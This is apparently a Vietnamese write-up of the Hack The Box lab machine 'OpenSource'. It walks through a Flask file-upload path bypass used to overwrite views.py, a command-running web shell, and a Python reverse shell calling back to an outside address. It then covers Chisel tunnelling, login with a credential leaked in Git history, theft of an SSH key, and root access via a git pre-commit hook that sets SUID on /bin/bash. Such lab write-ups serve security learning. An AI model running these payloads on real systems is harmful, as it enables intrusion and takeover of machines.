# Quick Overview

![](../../attachments/789e24a78e57e307944d8dbbde67cc32_thumb.png)         

| `Open Source`   |             |
| --------------- | ----------- |
| Release Date:   | 21 May 2022 |
| OS:             | Linux 🐧    |
| Difficulty:     | Easy        |
| Base Points:    | **20**      |
| Date Completed: | 23 Jul 2022 |

**Tags:**  `upload-file`, `directory-traversal`,  `source-code-analysis`,`docker`, `git`, `git-hook`, `reverse-proxy`

# Enumration
Như thường lệ, sử dụng NMAP để scan các ports, services của target.

```console
kali@kali:~/machines.HTB/OpenSource/Enum$ export IP=10.10.11.164
```

```console
kali@kali:~/machines.HTB/OpenSource/Enum$ export ports=$(sudo nmap $IP -p- --min-rate=1000 -oN 
scan_ports.txt|grep ^[0-9]|cut -d "/" -f 1|tr "\n" ","|sed s/,$//)
```

```console
kali@kali:~/machines.HTB/OpenSource/Enum$ sudo nmap $IP -p$ports -sV -sC -oN scan_services.txt
kali@kali:~/machines.HTB/OpenSource/Enum$ cat scan_services.txt

# Nmap 7.92 scan initiated Fri Jul 22 03:15:42 2022 as: nmap -p22,80,3000 -sV -sC -oN scan_services.txt 10.10.11.164
Nmap scan report for 10.10.11.164
Host is up (0.040s latency).

PORT     STATE    SERVICE VERSION
22/tcp   open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 1e:59:05:7c:a9:58:c9:23:90:0f:75:23:82:3d:05:5f (RSA)
|   256 48:a8:53:e7:e0:08:aa:1d:96:86:52:bb:88:56:a0:b7 (ECDSA)
|_  256 02:1f:97:9e:3c:8e:7a:1c:7c:af:9d:5a:25:4b:b8:c8 (ED25519)
80/tcp   open     http    Werkzeug/2.1.2 Python/3.10.3
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.1.2 Python/3.10.3
|     Date: Fri, 22 Jul 2022 07:15:51 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 5316
|     Connection: close
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>upcloud - Upload files for Free!</title>
|     <script src="/static/vendor/jquery/jquery-3.4.1.min.js"></script>
|     <script src="/static/vendor/popper/popper.min.js"></script>
|     <script src="/static/vendor/bootstrap/js/bootstrap.min.js"></script>
|     <script src="/static/js/ie10-viewport-bug-workaround.js"></script>
|     <link rel="stylesheet" href="/static/vendor/bootstrap/css/bootstrap.css"/>
|     <link rel="stylesheet" href=" /static/vendor/bootstrap/css/bootstrap-grid.css"/>
|     <link rel="stylesheet" href=" /static/vendor/bootstrap/css/bootstrap-reboot.css"/>
|     <link rel=
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.1.2 Python/3.10.3
|     Date: Fri, 22 Jul 2022 07:15:51 GMT
|     Content-Type: text/html; charset=utf-8
|     Allow: OPTIONS, GET, HEAD
|     Content-Length: 0
|     Connection: close
|   RTSPRequest: 
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
|_http-title: upcloud - Upload files for Free!
|_http-server-header: Werkzeug/2.1.2 Python/3.10.3
3000/tcp filtered ppp
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V=7.92%I=7%D=7/22%Time=62DA4EA7%P=x86_64-pc-linux-gnu%r(GetR
SF:equest,1573,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/2\.1\.2\x20P
SF:ython/3\.10\.3\r\nDate:\x20Fri,\x2022\x20Jul\x202022\x2007:15:51\x20GMT
SF:\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x20
SF:5316\r\nConnection:\x20close\r\n\r\n<html\x20lang=\"en\">\n<head>\n\x20
SF:\x20\x20\x20<meta\x20charset=\"UTF-8\">\n\x20\x20\x20\x20<meta\x20name=
SF:\"viewport\"\x20content=\"width=device-width,\x20initial-scale=1\.0\">\
SF:n\x20\x20\x20\x20<title>upcloud\x20-\x20Upload\x20files\x20for\x20Free!
SF:</title>\n\n\x20\x20\x20\x20<script\x20src=\"/static/vendor/jquery/jque
SF:ry-3\.4\.1\.min\.js\"></script>\n\x20\x20\x20\x20<script\x20src=\"/stat
SF:ic/vendor/popper/popper\.min\.js\"></script>\n\n\x20\x20\x20\x20<script
SF:\x20src=\"/static/vendor/bootstrap/js/bootstrap\.min\.js\"></script>\n\
SF:x20\x20\x20\x20<script\x20src=\"/static/js/ie10-viewport-bug-workaround
SF:\.js\"></script>\n\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href
SF:=\"/static/vendor/bootstrap/css/bootstrap\.css\"/>\n\x20\x20\x20\x20<li
SF:nk\x20rel=\"stylesheet\"\x20href=\"\x20/static/vendor/bootstrap/css/boo
SF:tstrap-grid\.css\"/>\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20hr
SF:ef=\"\x20/static/vendor/bootstrap/css/bootstrap-reboot\.css\"/>\n\n\x20
SF:\x20\x20\x20<link\x20rel=")%r(HTTPOptions,C7,"HTTP/1\.1\x20200\x20OK\r\
SF:nServer:\x20Werkzeug/2\.1\.2\x20Python/3\.10\.3\r\nDate:\x20Fri,\x2022\
SF:x20Jul\x202022\x2007:15:51\x20GMT\r\nContent-Type:\x20text/html;\x20cha
SF:rset=utf-8\r\nAllow:\x20OPTIONS,\x20GET,\x20HEAD\r\nContent-Length:\x20
SF:0\r\nConnection:\x20close\r\n\r\n")%r(RTSPRequest,1F4,"<!DOCTYPE\x20HTM
SF:L\x20PUBLIC\x20\"-//W3C//DTD\x20HTML\x204\.01//EN\"\n\x20\x20\x20\x20\x
SF:20\x20\x20\x20\"http://www\.w3\.org/TR/html4/strict\.dtd\">\n<html>\n\x
SF:20\x20\x20\x20<head>\n\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20http-equ
SF:iv=\"Content-Type\"\x20content=\"text/html;charset=utf-8\">\n\x20\x20\x
SF:20\x20\x20\x20\x20\x20<title>Error\x20response</title>\n\x20\x20\x20\x2
SF:0</head>\n\x20\x20\x20\x20<body>\n\x20\x20\x20\x20\x20\x20\x20\x20<h1>E
SF:rror\x20response</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20code
SF::\x20400</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Message:\x20Bad\x20req
SF:uest\x20version\x20\('RTSP/1\.0'\)\.</p>\n\x20\x20\x20\x20\x20\x20\x20\
SF:x20<p>Error\x20code\x20explanation:\x20HTTPStatus\.BAD_REQUEST\x20-\x20
SF:Bad\x20request\x20syntax\x20or\x20unsupported\x20method\.</p>\n\x20\x20
SF:\x20\x20</body>\n</html>\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Jul 22 03:17:15 2022 -- 1 IP address (1 host up) scanned in 92.81 seconds
```

Hmm :confused: , có port 3000 nhìn lạ quá ta. Mà không sao, cứ sắp xếp vector enum như bình thường thôi.

***Pirority of  Attack & Enumration Vector***: 

> 80 http   → 22 ssh, 3000 ppp

## Web Service Enumration

Bắt đầu từ port 80, truy cập vào địa chỉ `http://10.10.11.164/`, ta có được giao diện của trang web như sau.

![](../../attachments/Screenshot_2022-07-22_03_18_14.png)

Có vẻ như tính năng của trang web này là upload file và lưu trữ trên cloud.

Tiếp tục dạo quanh, khi scroll down xuống. Ta thấy 2 đường dẫn URL khá thú vị:
+ `Download`  → **Source code** của trang web. 
+ `Take me there` → Đường dẫn đến **section upload** của trang web.

![](../../attachments/Screenshot_2022-07-22_03_18_18.png)

**Preview chức năng upload:**

![](../../attachments/Screenshot_2022-07-22_03_20_27.png)

![](../../attachments/Screenshot_2022-07-22_03_20_46.png)

![](../../attachments/Screenshot_2022-07-22_03_21_06.png)

### Git review

Download và giải nén file source code, ta được một folder như sau:

```console
kali@kali:~/machines.HTB/OpenSource/source$ ls -la
total 32
drwxr-xr-x 6 kali kali 4096 Jul 23 11:02 .
drwxr-xr-x 5 kali kali 4096 Jul 23 11:27 ..
drwxr-xr-x 5 kali kali 4096 Apr 28 07:45 app
-rwxr-xr-x 1 kali kali  110 Apr 28 07:40 build-docker.sh
drwxr-xr-x 2 kali kali 4096 Apr 28 07:34 config
-rw-r--r-- 1 kali kali  574 Apr 28 07:45 Dockerfile
drwxr-xr-x 8 kali kali 4096 Apr 28 07:45 .git
```

→ Có khá nhiều folders, files. Nhưng mà mình để ý đến có folder `.git` này khá thú vị, cũng như các files `Docker` → trang web này đang chạy trong một `container`. 

#### GitTools
Mình sẽ sử dụng công cụ `GitTools` để extract các commit trong Git repo này.

```console
kali@kali:~/machines.HTB/OpenSource/exploit$ git clone https://github.com/internetwache/GitTools
```

Sau đó thực hiện extract Git repo.

```console
kali@kali:~/machines.HTB/OpenSource/exploit$ GitTools/Extractor/extractor.sh ../source ../source/extracted
kali@kali:~/machines.HTB/OpenSource/source$ ls -la extracted
total 28
drwxr-xr-x 7 kali kali 4096 Jul 23 11:02 .
drwxr-xr-x 6 kali kali 4096 Jul 23 11:02 ..
drwxr-xr-x 4 kali kali 4096 Jul 23 11:02 0-ee9d9f1ef9156c787d53074493e39ae364cd1e05
drwxr-xr-x 4 kali kali 4096 Jul 23 11:02 1-2c67a52253c6fe1f206ad82ba747e43208e8cfd9
drwxr-xr-x 4 kali kali 4096 Jul 23 11:02 2-c41fedef2ec6df98735c11b2faf1e79ef492a0f3
drwxr-xr-x 4 kali kali 4096 Jul 23 11:02 3-be4da71987bbbc8fae7c961fb2de01ebd0be1997
drwxr-xr-x 4 kali kali 4096 Jul 23 11:02 4-a76f8f75f7a4a12b706b0cf9c983796fa1985820
```

Sử dụng command `git log` để xem nội dung `comment` của mỗi lần `commit`.

```console
kali@kali:~/machines.HTB/OpenSource/source$git log --pretty=oneline
2c67a52253c6fe1f206ad82ba747e43208e8cfd9 (HEAD -> public) clean up dockerfile for production use
ee9d9f1ef9156c787d53074493e39ae364cd1e05 initial
```

Để có thể biết sự thay đổi giữa mỗi lần commit, mình sử dụng `git diff <commit1> <commit2>`. Thú vị thay, mình đã tìm được gì đó.

```console
kali@kali:~/machines.HTB/OpenSource/source/extracted$ git diff ee9d9f1 a76f8f7 
```

Trong file `settings.json` đã để lộ một `credential` về `http.proxy` : `dev01:Soulless_Developer#2022`

```shell
diff --git a/app/.vscode/settings.json b/app/.vscode/settings.json
new file mode 100644
index 0000000..5975e3f
--- /dev/null
+++ b/app/.vscode/settings.json
@@ -0,0 +1,5 @@
+{
+  "python.pythonPath": "/home/dev01/.virtualenvs/flask-app-b5GscEs_/bin/python",
+  "http.proxy": "http://dev01:Soulless_Developer#2022@10.10.10.128:5187/",
+  "http.proxyStrictSSL": false
+}
```

Trong file `views.py` , tồn tại 2 route khác là `'/'` và `'/download'`.

```shell
diff --git a/app/app/views.py b/app/app/views.py
index f2744c6..0f3cc37 100644
--- a/app/app/views.py
+++ b/app/app/views.py
@@ -6,7 +6,17 @@ from flask import render_template, request, send_file
 from app import app
 
 
-@app.route('/', methods=['GET', 'POST'])
+@app.route('/')
+def index():
+    return render_template('index.html')
+
+
+@app.route('/download')
+def download():
+    return send_file(os.path.join(os.getcwd(), "app", "static", "source.zip"))
+
+
+@app.route('/upcloud', methods=['GET', 'POST'])
 def upload_file():
     if request.method == 'POST':
         f = request.files['file']
@@ -20,4 +30,4 @@ def upload_file():
 @app.route('/uploads/<path:path>')
 def send_report(path):
     path = get_file_name(path)
-    return send_file(os.path.join(os.getcwd(), "public", "uploads", path))
\ No newline at end of file
+    return send_file(os.path.join(os.getcwd(), "public", "uploads", path))

```

Okay, cho đến lúc này ngoài việc thu thập được 1 `credential` kì lạ, thì cũng chẳng còn gì thú vị nữa.

### Source code review

Cấu trúc folder của website như sau:

```shell
app
├── app
│   ├── configuration.py
│   ├── __init__.py
│   ├── static
│   │   ├── css
│   │   ├── js
│   │   └── vendor
│   ├── templates
│   │   ├── index.html
│   │   ├── success.html
│   │   └── upload.html
│   ├── utils.py
│   └── views.py
├── INSTALL.md
├── public
│   └── upload
└── run.py
```

Sau một thời gian tìm hiểu folder này, mình thấy có một vài điều thú vị trong 2 file `views.py` và `utils.py`.

Trong `views.py` có 1 route nhận `untrusted data` của người dùng và thực hiện filter nó (nhưng tiếc cái vẫn bị bypass được). Đó là route `upload`, untrusted data của mình lúc này là biến `f.filename` (tên file upload). 

```python
<--SNIP-->
@app.route('upcloud', methods=['GET', 'POST'])
def upload_file():
    if request.method == 'POST':
        f = request.files['file']
        file_name = get_file_name(f.filename)
        file_path = os.path.join(os.getcwd(), "public", "uploads", file_name)
        f.save(file_path)
        return render_template('success.html', file_url=request.host_url + "uploads/" + file_name)
    return render_template('upload.html')
<--SNIP-->
```

Lúc đầu biến này sẽ được filter bởi hàm `get_file_name` (mà mình sẽ đề cập bên dưới). Sau đó sẽ được thực hiện lưu trong một folder có đường dẫn như sau `<pwd>/public/uploads/` (thông qua `os.path.join`), pwd = os.getcwd() = /app/app/. Nhưng khi `os.path.join` nhận được một absolute path thì sẽ thực hiện trả về absolute path đó.

Hình ảnh dưới đây là ví dụ minh hoạ.

![](../../attachments/Pasted%20image%2020220727020101.png)

Còn route này chỉ đơn thuần render file thông qua `endpoint` /uploads/

```python
<--SNIP-->

@app.route('/uploads/<path:path>')
def send_report(path):
    path = get_file_name(path)
    return send_file(os.path.join(os.getcwd(), "public", "uploads", path))
```

Trong file `utils.py`, mình quan tâm đến hàm `get_file_name`. Hàm này thực hiện replace chuỗi kí tự `../` thành ký tự rỗng ` `  một cách đệ quy → tránh bị path traversal (đó là do anh lập trình viên nghĩ, còn mình thì không 🤪)

> việc replace như trên chỉ mitigate việc path traversal mà thôi, bới ta có thể path traversal đến những absolute path file.  

```python
import time


def current_milli_time():
    return round(time.time() * 1000)


"""
Pass filename and return a secure version, which can then safely be stored on a regular file system.
"""


def get_file_name(unsafe_filename):
    return recursive_replace(unsafe_filename, "../", "")


"""
TODO: get unique filename
"""


def get_unique_upload_name(unsafe_filename):
    spl = unsafe_filename.rsplit("\\.", 1)
    file_name = spl[0]
    file_extension = spl[1]
    return recursive_replace(file_name, "../", "") + "_" + str(current_milli_time()) + "." + file_extension


"""
Recursively replace a pattern in a string
"""


def recursive_replace(search, replace_me, with_me):
    if replace_me not in search:
        return search
    return recursive_replace(search.replace(replace_me, with_me), replace_me, with_me)
```

→  Từ những thông tin trên, mình đã có một hướng đi để thực hiện khai thác `path traversal`.

# Exploitation
## Exploit Flask App

Để kiếm chứng, mình sẽ thử upload một file `views.py` mới đè lên file `views.py` cũ có nội dung như sau:

![](../../attachments/Screenshot_2022-07-22_03_39_11.png)

Để có thể ghi đè lên file `views.py` cũ, mình sẽ edit lại file name thành vị trí của file views.py cũ là `/app/app/views.py` (quan sát source code, mình suppose rằng folder app sẽ nằm trong thư mục root, nên hoàn toàn có thể bypass hàm `get_file_name` ở trên bằng absolute path)

![](../../attachments/Screenshot_2022-07-22_03_39_50.png)

Truy cập đến `endpoint` mà mình mới tạo 

![](../../attachments/Screenshot_2022-07-22_03_40_08.png)

→ **BOOM** replace file thành công. Đến đây mình có thể hoàn toàn upload shell để tương tác với server.

Thay đổi một chút ở đoạn code trên để tạo ra `web shell` đơn giản phục vụ cho việc enum tiếp theo.

```python
<--SNIP-->
@app.route('/system')
def cmd():
    return '''
<html>
    <body>
        <h1>'''+ os.popen(request.args.get('cmd')).read() +'''</h1>
    </body>
</html>
    '''
```

## Quick look at container

Như đã nói ban đầu, trang web này đang được host trong một `container` của `docker`. Mình sẽ thực hiện enum cơ bản trên `container` này.

**ID:**

![](../../attachments/Screenshot_2022-07-25_04_21_54.png)

**Root Directory:** chứa file `.dockerenv`

![](../../attachments/Screenshot_2022-07-25_04_22_52.png)

**Network:**

![](../../attachments/Screenshot_2022-07-25_04_39_14.png)

![](../../attachments/Screenshot_2022-07-25_04_39_37.png)

![](../../attachments/Screenshot_2022-07-25_04_39_55.png)

→ Với các thông tin trên đã cho ta biết, container này có IP: 172.17.0.5 và  host IP: 172.17.0.1 → đây cũng có thể là internal IP của machine này. 

Tới đây mình có nghĩ đến việc dựng một `tunnel` để có thể tương tác trực tiếp với machine thông qua kết nối của `container` với `machine`. Sau một hồi google mình tìm thấy `Chisel` [here](https://github.com/jpillora/chisel)

## Python3 Reverse Shell

Để thuận tiện cho việc xây dựng tunnel, mình tiếp tục upload python3 reverse shell

**Raw payload:**

```python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.3",9090));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")'
```

**URL encoded payload:**

```
python3%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%2210.10.14.3%22%2C9090%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B%20os.dup2%28s.fileno%28%29%2C1%29%3Bos.dup2%28s.fileno%28%29%2C2%29%3Bimport%20pty%3B%20pty.spawn%28%22%2Fbin%2Fsh%22%29%27
```

Dựng nc listener ở port 9090 tương ứng .Và đem payload trên và bỏ vào url thôi.

```console
kali@kali~/machines.HTB/OpenSource/exploit$ nc -lnvp 9090
listening on [any] 9090 ...
connect to [10.10.14.3] from (UNKNOWN) [10.10.11.164] 59804
/app #
```

→ :tada: Ta đã có một `reverse shell`

## Chisel Tunnel
Download source code của `chisel` và giải nén

```console
kali@kali:~/machines.HTB/OpenSource/exploit$ wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz 
<--SNIP-->
kali@kali:~/machines.HTB/OpenSource/exploit$ gunzip chisel_1.7.7_linux_amd64.gz
```

Dựng http server để `container` lấy file

```console
kali@kali:~/machines.HTB/OpenSource/exploit$ sudo python3 -m http.server 8000
```

Đồng thời kích hoạt `Chisel` với mode `server` ở port 1337 để thực hiện reverse port forwarding.

```console
kali@kali:~/machines.HTB/OpenSource/exploit$ sudo chmod +x ./chisel_1.7.7_darwin_amd64
kali@kali:~/machines.HTB/OpenSource/exploit$ sudo ./chisel_1.7.7_linux_amd64 server --reverse --port 1337
2022/07/23 17:09:12 server: Reverse tunnelling enabled
<--SNIP-->
2022/07/23 17:15:38 server: session#1: tun: proxy#R127.0.0.1:1080=>socks: Listening
```

Chuyển qua shell của container, thực hiện lấy `Chisel` và sử dụng `Chisel` ở mode `client` 

```console
/app # mkdir /pipi
/app # cd /pipi
/pipi # wget http://10.10.11.164:8000/chisel_1.7.7_linux_amd64
<--SNIP-->
/pipi # chmod +x chisel_1.7.7_linux_amd64
/pipi # ./chisel_1.7.7_linux_amd64 client 10.10.14.3:1337 R:socks
2022/07/23 17:20:24 client: Connecting to ws:10.10.14.3:1337
2022/07/23 17:20:24 client: Connected (Latency 32.537626ms)
```

→ Ngon, kết nối thành công. 

Tiếp theo ta sẽ cấu hình `proxychains` để có dùng command trên Kali để tương tác với machine. Kéo xuống dưới cùng và thêm `socks5 127.0.0.1 1080`

```console
kali@kali:~/machines.HTB/OpenSource/exploit$ sudo nano /etc/proxychains4.conf
<--SNIP-->

[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
#socks4         127.0.0.1 9050
socks5  127.0.0.1 1080
```

> Tại sao lại thêm `socks5 127.0.0.1 1080` ? vì với `R:socks` Chisel sẽ sử dụng socks5 với default port là 1080 để thực hiện kết nối

## Rustscan
Thực hiện enum ports trên machine bằng `Rustscan`.

```
kali@kali:~/machines.HTB/OpenSource/exploit$ proxychains4 rustscan -a 172.17.0.1
```

→ 3 ports đang mở: 
+ 22  - no cap
+ 80 - port của web app
+ 3000 - port của gitea

## Gitea

Để có thể truy cập vào gitea thông qua `proxychains4` ta cần phải setup một chút. Cấu hình FoxyProxy như hình dưới.

```
PROXY TYPE: SOCKS5
PROXY IP: localhost
PORT:1080
```

![](../../attachments/Screenshot_2022-07-25_05_27_02.png)

Truy cập vào URL: `http:172.17.0.1:3000`,  

![](../../attachments/Pasted%20image%2020220727012944.png)

Đăng nhập với credentials mà mình đã tìm thấy trước đó trong các `commit` của git: 

	dev01:Soulless_Developer#2022

![](../../attachments/Pasted%20image%2020220727013153.png)

Và đây là dashboard `gitea` của user `dev01`

Thực hiện truy cập vào repo `home-backup` mà `dev01` đã thực hiện tạo `main` branch. Uầy, anh `dev01` này không biết do buồn ngủ hay gì lại đi push `home folder` của chính mình lên gitea. Xui thay trong đó lại có folder `.ssh` (có thể chứa key ssh kết nối với machine). 

![](../../attachments/Screenshot_2022-07-23_11_31_56.png)

![](../../attachments/Screenshot_2022-07-23_11_32_11%202.png)

Và đúng là như vậy, mình đã hoàn toàn lấy được key `id_rsa` của anh `dev01`. 

![](../../attachments/Screenshot_2022-07-23_11_32_25.png)

Vậy ta đã có key `id_rsa` ssh của `dev01`, lấy về máy và connect tới machine bằng ssh thôi. 

```
kali@kali:~/machines.HTB/OpenSource/exploit$ ssh dev01@10.10.11.164 -i id_rsa
<--SNI-->
dev01@opensource:~$
```

## User Own

Lấy `flag` của `user`. 

```
dev01@opensource:~$ cat user.txt 
################################
```

# Privilege Escalation
Để thực hiện leo thang đặc quyền, ta cần phải thực hiện các bước enum thông thường bằng tay trước: [S1REN's way](https://sirensecurity.io/blog/linux-privilege-escalation-resources/)

→ `Nothing` → bằng tay không được thì dùng `tool` thôi → sử dụng `pspy64` để quan sát các process.

Setup `pspy64` như cách mà mình đã setup `chisel` trên container.

```console
dev01@opensource:~$ wget http://10.10.14.3:8000/pspy64
--2022-07-25 09:39:51--  http://10.10.14.3:8000/pspy64
Connecting to 10.10.14.3:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3078592 (2.9M) [application/octet-stream]
Saving to: ‘pspy64’

pspy64                    100%[===================================>]   2.94M  4.45MB/s    in 0.7s    

2022-07-25 09:39:52 (4.45 MB/s) - ‘pspy64’ saved [3078592/3078592]

dev01@opensource:~$ chmod +x pspy64
```

Start `pspy64` và quan sát các `process` đang chạy trong machine

```console
ev01@opensource:~$ ./pspy64 
pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     

<--SNIP-->
```

Sau một hồi quan sát, cứ 1 phút mình thấy có một chuỗi git script chạy như sau. Có vẻ đây là đoạn script để back-up code.  

![](../../attachments/Screenshot_2022-07-23_11_42_29.png)

Trong một vài bài CTF mình từng chơi, mình có thể abuse pre-commit script để tạo một revershell cũng như convert /bin/bash thành SUID. 

> Nôm na, là mỗi lần git thực hiện commit thì sẽ thực hiện các script có trong pre-commit trước bới các git-hooks.

Ở đây mình chỉ đơn giản convert /bin/bash sang SUID bằng cách thêm `chmod u+s /bin/bash` vào file pre-commit.sample có trong folder `/.git/hooks` sau đó rename thành pre-commit.

```console
dev01@opensource:~/.git/hooks$ cat pre-commit 
#!/bin/sh
#
# An example hook script to verify what is about to be committed.
# Called by "git commit" with no arguments.  The hook should
# exit with non-zero status after issuing an appropriate message if
# it wants to stop the commit.
#
# To enable this hook, rename this file to "pre-commit".

chmod u+s /bin/bash

if git rev-parse --verify HEAD >/dev/null 2>&1
then
        against=HEAD
else
        # Initial commit: diff against an empty tree object
        against=4b825dc642cb6eb9a060e54bf8d69288fbee4904
fi

<--SNIP-->

```

Giờ ta cứ chờ đợi cho đến khi sticky bit được set.

![](../../attachments/Screenshot_2022-07-25_05_55_48%201.png)

## Root Own

Lấy `flag` của `root` thôi.

```console
dev01@opensource:~/.git/hooks$ bash -p
bash-4.4# id
uid=1000(dev01) gid=1000(dev01) euid=0(root) groups=1000(dev01)
bash-4.4# cat /root/root.txt
################################
```

